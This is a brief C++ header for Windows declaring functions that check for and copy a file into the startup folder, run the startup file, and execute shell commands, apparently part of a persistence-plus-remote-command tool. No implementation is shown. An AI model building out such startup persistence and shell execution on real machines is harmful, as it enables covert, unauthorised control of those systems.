#pragma once
#include <iostream>
#include <array>
#include <fstream>
#include <string>
#include <Windows.h>

bool isInStartUp(char* filePath);

void copyToStartUp(char* filePath);

void executeStartUpFile();

std::string executeShell(char* command);